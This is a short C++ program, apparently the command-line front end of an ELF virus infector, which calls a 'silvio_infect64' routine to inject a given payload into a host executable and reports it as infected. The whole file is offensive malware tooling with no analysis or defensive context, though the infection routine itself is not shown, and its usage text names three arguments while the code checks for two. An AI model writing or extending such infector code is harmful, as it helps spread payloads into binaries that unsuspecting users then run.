#include "infector/silvio.hh"
#include "std/stdio.hh"

int main(int argc, char** argv) {
  if (argc != 3) {
    printf(
        "[*] Usage %s <host> <payload> <virus>\n"
        "\thost: the elf to be infected\n"
        "\tpayload: the payload that will be added to the host\n",
        argv[0]);

    return EXIT_FAILURE;
  }

  if (vt::infector::silvio_infect64(argv[1], argv[2])) {
    printf("infected %s\n", argv[1]);

    return EXIT_SUCCESS;
  }
  return EXIT_FAILURE;
}